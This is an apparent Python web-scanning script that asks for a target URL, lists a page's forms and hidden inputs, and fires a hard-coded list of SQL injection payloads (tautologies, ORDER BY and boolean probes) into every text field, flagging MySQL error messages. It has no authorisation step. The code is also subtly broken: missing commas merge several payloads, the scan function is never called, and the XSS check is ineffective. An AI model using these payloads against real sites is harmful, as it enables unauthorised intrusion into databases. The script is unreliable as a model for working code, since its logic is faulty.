import requests
from bs4 import BeautifulSoup
import re

class Main:
    @staticmethod
    def menu():
        print("""
            1. **Web Site Scan**
        """)

    @staticmethod
    def entry():
        entry = input("------> Please enter the required number:\t")
        if entry.isdigit():
            return int(entry)
        else:
            print("Invalid input. Please enter a number.")
            return None

    @staticmethod
    def webs():
        url = input("Please enter target url: ")
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            title = soup.title.string
            print("Title: ", title)

            friend_forums = soup.find_all('input')
            for forum in friend_forums:
                print("Forum area: ", forum.get('name'))

            all_links = soup.find_all('a', href=True)
            for link in all_links:
                href = link.get('href')
                if href.startswith('https'):
                    print("Connection: ", href)

            hidden_inputs = soup.find_all('input', type='hidden')
            for hidden_input in hidden_inputs:
                print("Hidden Input:", hidden_input)

            sql_forums = soup.find_all('form')
            for sqlf in sql_forums:
                sqlf_action = sqlf.get('action')
                sqlf_inputs = sqlf.find_all('input')
                for input_friend in sqlf_inputs:
                    if input_friend.get('type') == 'text':
                        input_name = input_friend.get('name')
                        sql_payload = [
                            "' OR '1",
                            "' OR 1 -- -",
                            " OR '' = ",
                            " OR 1 = 1 -- -",
                            "' OR '' = ",
                            "=",
                            "LIKE",
                            "'=0--+,",
                            "OR 1=1,",
                            "' OR 'x'='x,",
                            "' AND id IS NULL; --,",
                            "'''''''''''''UNION SELECT '2,",
                            "1' ORDER BY 1--+,",
                            "1' ORDER BY 2--+,",
                            "1' ORDER BY 3--+,",
                            "1' ORDER BY 1,2--+,",
                            "1' ORDER BY 1,2,3--+,",
                            "1' GROUP BY 1,2,--+,",
                            "1' GROUP BY 1,2,3--+,",
                            "' GROUP BY columnnames having 1=1 --,"
                            "AND 1083=1083 AND (1427=1427,"
                            "AND 7506=9091 AND (5913=5913,"
                            "AND 1083=1083 AND ('1427=1427,"
                            "AND 7506=9091 AND ('5913=5913,"
                            "AND 7300=7300 AND 'pKlZ'='pKlZ,"
                            "AND 7300=7300 AND 'pKlZ'='pKlY,"
                            "AND 7300=7300 AND ('pKlZ'='pKlZ,"
                            "AND 7300=7300 AND ('pKlZ'='pKlY,"
                            "AS INJECTX WHERE 1=1 AND 1=1,"
                            "AS INJECTX WHERE 1=1 AND 1=0,"
                            "AS INJECTX WHERE 1=1 AND 1=1#,"
                            "AS INJECTX WHERE 1=1 AND 1=0#,"
                            "AS INJECTX WHERE 1=1 AND 1=1--, "
                            "AS INJECTX WHERE 1=1 AND 1=0--"
                        ]
                        for payload in sql_payload:
                            sql_data = {input_name: payload}
                            injection_response = requests.post(url + sqlf_action, data=sql_data)
                            if 'You have an error in your SQL syntax' in injection_response.text:
                                print("Sql injection vulnerability detected!!!!")

                        script_tags = soup.find_all('script', string=re.compile('(<|&lt;)script(>|&gt;)'))
                        if script_tags:
                            print("Potential XSS (Cross-Site Scripting) Vulnerability Detected!")

 

if __name__ == '__main__':
    Main.menu()
    entry = Main.entry()
    if entry is not None:
        
            print("Invalid option.")
